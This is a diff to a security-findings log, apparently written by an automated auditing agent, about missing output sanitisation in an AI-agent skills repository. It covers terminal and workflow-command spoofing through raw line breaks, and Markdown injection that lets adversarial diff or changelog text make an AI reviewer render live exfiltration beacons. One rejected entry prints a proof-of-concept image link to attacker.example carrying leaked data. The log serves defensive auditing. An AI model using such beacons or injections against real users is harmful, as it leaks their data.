@@ -3085,3 +3085,64 @@ location: plugins/ievo/agents/deep-reviewer.md (Step 3 "Build structured output"
 ```
 
 Directly re-read this run: Step 3's "Excerpt containment" note is titled and scoped explicitly to `Issue:`/`Suggestion:` ("verbatim source quotes only"). The finding template's `#### [<severity>] <category> — <short title>` header is never named as requiring fencing, unlike `**File:** \`<path>\`` one line below it, which the template already wraps in backticks. `deep-review/SKILL.md`'s Step 5 renders the whole report, header lines included, as live Markdown in the Claude Code chat UI. A finding whose short title directly quotes a crafted line from adversarial diff content (plausible per this agent's own documented working-tree-mode input shape) could smuggle a live exfiltration beacon.
+
+---
+
+## S-2026-08-24-001 — discover.mjs / evolution_candidates.mjs never adopted stripForDisplay(), the \r\n-inclusive strip their siblings shipped in skills#648/#650
+
+```yaml
+id: S-2026-08-24-001
+discovered_at: 2026-08-24T07:14:49Z
+run_id: 32699971736
+target_repo: ievo-ai/skills
+title: discover.mjs and evolution_candidates.mjs echo attacker-influenceable CLI-argument error messages through only CONTROL_CHAR_RE (which deliberately excludes \r/\n), not the stripForDisplay() helper that scan_repo.mjs/validate_agents.mjs/validate_skills.mjs already adopted in skills#648/#650 — a raw \r/\n reaching an errLog() sink enables terminal-line spoofing and, if the stderr is ever captured into a GitHub Actions job log, workflow-command forgery via a line starting with ::
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/655
+cwe: CWE-117
+confidence: high
+location: plugins/ievo/scripts/discover.mjs (parsePositiveInt L554-559, requireValue L567-573, main()'s parseArgs catch L688, --stack-file read/parse-failure echoes L698-724, stdin parse-failure echoes L740-741, skills.sh failed-queries WARN L776-777); plugins/ievo/scripts/evolution_candidates.mjs (requireValue/parseCount L640-650, main()'s parseArgs catch L697, command-dispatch catch L735-737, sanitizeSessionId L251, appendCandidate --text-file catch L468) — no stripForDisplay() export exists in evolution_candidates.mjs at all
+```
+
+Directly re-read this run: both files' own `CONTROL_CHAR_RE` (`discover.mjs:74`, `evolution_candidates.mjs:129`) is byte-identical to the class already documented elsewhere in this repo as deliberately excluding `\x0a`/`\x0d` to preserve legitimate multi-line values — the exact reason `scan_repo.mjs`, `validate_agents.mjs`, and `validate_skills.mjs` each layered a `\r`/`\n`-inclusive `stripForDisplay()` wrapper on top of it (confirmed present via `grep -n stripForDisplay` in all three: `scan_repo.mjs:112` plus 4 call sites citing skills#648, `validate_agents.mjs:104` plus 6 call sites, `validate_skills.mjs:97` plus 9 call sites, several inline comments explicitly crediting skills#648 for the fix). `discover.mjs` still calls bare `.replace(CONTROL_CHAR_RE, "")` at every echo site listed above (confirmed via direct read of lines 550-573, 685-780) — no `stripForDisplay` identifier exists anywhere in the file. `evolution_candidates.mjs` has zero occurrences of `stripForDisplay` at all (confirmed via `grep -n stripForDisplay plugins/ievo/scripts/evolution_candidates.mjs` returning empty) — its `requireValue`/`parseCount`/`parseArgs` catch (L697, bare `err.message`, no strip at all) and command-dispatch catch (L735-737, `CONTROL_CHAR_RE`-only) both leave a raw `\r`/`\n` in an attacker-influenceable CLI value (`--session`, `--keep`, `--text-file`, or an unknown flag) intact through to the printed error. `scan_repo.mjs`'s own equivalent gap was independently re-derived and filed by the previous run (S-2026-08-23-001 → skills#650) and confirmed fixed in this run's re-check — `discover.mjs`/`evolution_candidates.mjs` are the two remaining scripts in `plugins/ievo/scripts/` without the parity fix.
+
+---
+
+## S-2026-08-24-002 — evolution.md's Step 4.4 autocommit-failure fallback writes raw branch-name/failure-reason into pending.md with no excerpt containment, unlike every other rendered field in the file
+
+```yaml
+id: S-2026-08-24-002
+discovered_at: 2026-08-24T07:14:49Z
+run_id: 32699971736
+target_repo: ievo-ai/skills
+title: evolution.md Step 4.4 sub-step 5's autocommit-failure fallback report appends raw git branch name and commit/hook failure-reason text into .ievo/evolution-candidates/pending.md's Branch:/Reason: lines with no backtick-fencing, unlike the overlay-file-path (regex-validated) and every other Markdown-rendered field this same file writes elsewhere (Step 4's lesson-text containment note, Step 5's SKIPPED-line containment notes)
+status: rejected
+issue_url: https://github.com/ievo-ai/skills/issues/656
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/evolution.md (Step 4.4 sub-step 5, pending.md fallback-report template)
+```
+
+Directly re-read this run: Step 4.4 sub-step 5's fenced template writes `- Branch: <branch-name>` and `- Reason: <failure reason, truncated to one line>` verbatim into `.ievo/evolution-candidates/pending.md` when the scoped auto-commit fails — confirmed via direct read of the surrounding steps (overlay-file-path is regex-validated against `^\.ievo/evolution/(project\.md|(agents|skills)/[A-Za-z0-9._-]+\.md)$` before use, and the commit-message note explicitly warns the lesson's free-text title can carry shell metacharacters and must not reach a double-quoted `-m` string — showing this file is otherwise careful about untrusted text — yet neither `<branch-name>` nor `<failure reason>` gets any backtick-fencing treatment before being written). `pending.md` is designed to be read later — by a human reviewing it directly, or by `evo-auto-enable/SKILL.md`'s own nudge detector.
+
+**REJECTED same-run by the downstream Router's skeptic-mode review (issue comment, 2026-08-24):** the filed exploit chain's proof-of-concept branch name — `` ![x](https://attacker.example/beacon.png?d=leak) `` — is claimed as "legal Git ref syntax", but this was NOT independently verified against the primary source (`git check-ref-format`) before filing, only asserted from recall. The Router's review ran `git check-ref-format --branch` against the exact PoC and found Git's ref-name grammar (`git help check-ref-format` rule 4) explicitly forbids `?` and `[` — both characters the PoC depends on — so the cited branch name could never be created via `git branch`/`git checkout -b`. Per the eva#132 skeptic-mode rule, any single refutation-attempt failure closes the issue regardless of other attempts. This is exactly the failure mode CLAUDE.md's "Verify documentation before changing or asserting tool/library behavior" rule exists to catch, applied here to a `git` CLI behavior claim rather than a library/action input — the citer (this run) did not verify before asserting, and should have. Lesson for future runs: `git check-ref-format --branch '<candidate>'` is a one-command check and should gate any exploit chain that depends on a specific string being a legal git ref, the same way a config/library claim already gets checked.
+
+The Router's rejection comment also noted the underlying containment gap may still be real through an unverified different vector — NOT independently confirmed by Eva, carried forward only as a lead for a possible future re-filing, not as a live finding: (a) a bare `www.attacker.example`-style branch name IS a legal ref and GFM auto-linkifies bare `www.` text, which could carry the "spoofed link" half of the impact via `<branch-name>` without the illegal characters; (b) `<failure reason>` is raw commit/pre-commit-hook stderr, entirely unconstrained by git's ref-name grammar — a malicious hook could print arbitrary Markdown to stderr. Neither has been independently re-verified by Eva as of this note. A corrected re-filing would need its own fresh Skeptic-mode review and is not endorsed by this record.
+
+---
+
+## S-2026-08-24-003 — version/SKILL.md renders remote CHANGELOG.md content verbatim with zero excerpt containment, unlike every sibling skill that touches externally-sourced text
+
+```yaml
+id: S-2026-08-24-003
+discovered_at: 2026-08-24T07:14:49Z
+run_id: 32699971736
+target_repo: ievo-ai/skills
+title: version/SKILL.md Step 4 fetches CHANGELOG.md from raw.githubusercontent.com and Step 5 renders the selected sections verbatim in the chat UI with no excerpt-containment/backtick-fencing rule anywhere in the file, unlike inspect/SKILL.md, feedback/SKILL.md, security-check/SKILL.md, evo/SKILL.md, overlay-status/SKILL.md, deep-review/SKILL.md, review-retrospective/SKILL.md, and vuln-scan/SKILL.md, which all carry a dedicated Excerpt containment section for externally-sourced text
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/657
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/skills/version/SKILL.md (Step 4 "Fetch and window the changelog", Step 5 "Render")
+```
+
+Directly re-read this run: Step 4 fetches `CHANGELOG.md` from `main` via unauthenticated `curl` and its own "Robustness notes" instruct `Present the selected sections verbatim and in file order... Do not summarise or rewrite them`; Step 5's render templates splice `<verbatim changelog body for vX.Y.Z>` straight into the assistant's printed output. A full-file grep (`grep -in "containment\|backtick\|fenc" plugins/ievo/skills/version/SKILL.md`, 189 lines total) returns zero matches — confirming no excerpt-containment treatment exists anywhere in this file, unlike every sibling skill in `plugins/ievo/skills/` that touches externally-sourced text. `/ievo:version` is a routine, frequently-invoked, ostensibly read-only command ("am I up to date"), making this a broad-reach vector: any content landing in `ievo-ai/skills`'s public `CHANGELOG.md` on `main` (compromised maintainer credential, a merged-then-reverted malicious PR, or an unsanitized auto-generated changelog entry quoting untrusted PR text) that carries a crafted `![...](...)`/`[...](...)` renders live — with a tracking-beacon or spoofed-link effect — the instant any user behind latest asks "am I up to date".
